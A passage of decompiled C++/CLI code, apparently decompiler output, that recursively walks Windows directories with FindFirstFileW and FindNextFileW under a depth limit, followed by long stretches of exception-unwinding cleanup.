                      ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) = ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) - 1;
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      if (^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) == 0)
                      {
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 24) = 0;
                      }
                    }
                    char* chPtr1 = (char*) \u003CModule\u003E.new\u005B\u005D(8192U);
                    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
                    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar7);
                    // ISSUE: fault handler
                    try
                    {
                      \u003CModule\u003E.MultiByteToWideChar(0U, 0U, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1), -1, chPtr1, 4096);
                    }
                    __fault
                    {
                      // ISSUE: method pointer
                      // ISSUE: cast to a function pointer type
                      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar7);
                    }
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar7);
                    _WIN32_FIND_DATAW wiN32FindDataw;
                    firstFileW = \u003CModule\u003E.FindFirstFileW(chPtr1, &wiN32FindDataw);
                    if ((IntPtr) firstFileW != new IntPtr(-1))
                    {
                      do
                      {
                        char* chPtr2 = (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_13JOFGPIOO\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F\u0024AA\u0040;
                        int num3 = (int) ((IntPtr) &wiN32FindDataw + 44);
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        short num4 = ^(short&) ((IntPtr) &wiN32FindDataw + 44);
                        short num5 = 46;
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        if (^(short&) ((IntPtr) &wiN32FindDataw + 44) >= (short) 46)
                        {
                          while ((int) num4 <= (int) num5)
                          {
                            if (num4 != (short) 0)
                            {
                              num3 += 2;
                              ++chPtr2;
                              num4 = *(short*) num3;
                              num5 = (short) *chPtr2;
                              if ((int) num4 < (int) num5)
                                break;
                            }
                            else
                              goto label_59;
                          }
                        }
                        char* chPtr3 = (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_15DDHGOCBH\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F4\u003F\u0024AA\u003F\u0024AA\u0040;
                        int num6 = (int) ((IntPtr) &wiN32FindDataw + 44);
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        short num7 = ^(short&) ((IntPtr) &wiN32FindDataw + 44);
                        short num8 = 46;
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        if (^(short&) ((IntPtr) &wiN32FindDataw + 44) >= (short) 46)
                        {
                          while ((int) num7 <= (int) num8)
                          {
                            if (num7 != (short) 0)
                            {
                              num6 += 2;
                              ++chPtr3;
                              num7 = *(short*) num6;
                              num8 = (short) *chPtr3;
                              if ((int) num7 < (int) num8)
                                break;
                            }
                            else
                              goto label_59;
                          }
                        }
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        if ((^(int&) ref wiN32FindDataw & 16) != 0)
                        {
                          dataTPtr1 = (_bstr_t.Data_t*) \u003CModule\u003E.@new(12U);
                          _bstr_t.Data_t* dataTPtr2;
                          // ISSUE: fault handler
                          try
                          {
                            if ((IntPtr) dataTPtr1 != IntPtr.Zero)
                            {
                              *(int*) ((IntPtr) dataTPtr1 + 4) = 0;
                              *(int*) ((IntPtr) dataTPtr1 + 8) = 1;
                              char* chPtr4 = \u003CModule\u003E.SysAllocString((char*) ((IntPtr) &wiN32FindDataw + 44));
                              *(int*) dataTPtr1 = (int) chPtr4;
                              if ((IntPtr) chPtr4 != IntPtr.Zero)
                                dataTPtr2 = dataTPtr1;
                              else
                                goto label_76;
                            }
                            else
                              dataTPtr2 = (_bstr_t.Data_t*) 0;
                          }
                          __fault
                          {
                            \u003CModule\u003E.delete((void*) dataTPtr1);
                          }
                          _bstr_t bstrT;
                          // ISSUE: cast to a reference type
                          // ISSUE: explicit reference operation
                          ^(int&) ref bstrT = (int) dataTPtr2;
                          if ((IntPtr) dataTPtr2 != IntPtr.Zero)
                          {
                            // ISSUE: fault handler
                            try
                            {
                              if (*(int*) ((IntPtr) dataTPtr2 + 4) == 0)
                                *(int*) ((IntPtr) dataTPtr2 + 4) = (int) \u003CModule\u003E._com_util\u002EConvertBSTRToString((char*) *(int*) dataTPtr2);
                              sbyte* _Val = (sbyte*) *(int*) ((IntPtr) dataTPtr2 + 4);
                              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
                              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
                              // ISSUE: fault handler
                              try
                              {
                                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar8);
                              }
                              __fault
                              {
                                // ISSUE: method pointer
                                // ISSUE: cast to a function pointer type
                                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
                              }
                              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
                              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar3 + 8), p), _Val), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040);
                              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
                              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar9);
                              // ISSUE: fault handler
                              try
                              {
                                \u003CModule\u003E.ADUixeTjiMK(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2), limit, countLimit + 1);
                              }
                              __fault
                              {
                                // ISSUE: method pointer
                                // ISSUE: cast to a function pointer type
                                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar9);
                              }
                              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar9);
                            }
                            __fault
                            {
                              // ISSUE: method pointer
                              // ISSUE: cast to a function pointer type
                              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(_bstr_t\u002E\u007Bdtor\u007D), (void*) &bstrT);
                            }
                            if (\u003CModule\u003E.InterlockedDecrement((int*) ((IntPtr) dataTPtr2 + 8)) == 0)
                            {
                              uint num9 = (uint) *(int*) dataTPtr2;
                              if (num9 != 0U)
                                \u003CModule\u003E.SysFreeString((char*) num9);
                              uint num10 = (uint) *(int*) ((IntPtr) dataTPtr2 + 4);
                              if (num10 != 0U)
                                \u003CModule\u003E.delete\u005B\u005D((void*) num10);
                              \u003CModule\u003E.delete((void*) dataTPtr2);
                            }
                          }
                          else
                            goto label_84;
                        }
label_59:;
                      }
                      while (\u003CModule\u003E.FindNextFileW(firstFileW, &wiN32FindDataw) != 0);
                      if (\u003CModule\u003E.GetLastError() == 18U)
                        \u003CModule\u003E.FindClose(firstFileW);
                      else
                        goto label_92;
                    }
                    else
                      break;
                  }
                  else
                    goto label_108;
                }
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Estack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Tidy((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) &stdAllocatorWcharT4);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT4);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT3);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
    return false;
label_76:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                // ISSUE: fault handler
                try
                {
                  \u003CModule\u003E._com_issue_error(-2147024882);
                }
                __fault
                {
                  \u003CModule\u003E.delete((void*) dataTPtr1);
                }
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Estack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
        }
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
    }
label_84:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E._com_issue_error(-2147024882);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Estack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
        }
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
    }
label_92:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.FindClose(firstFileW);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Estack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Tidy((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) &stdAllocatorWcharT4);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT4);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT3);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
        }
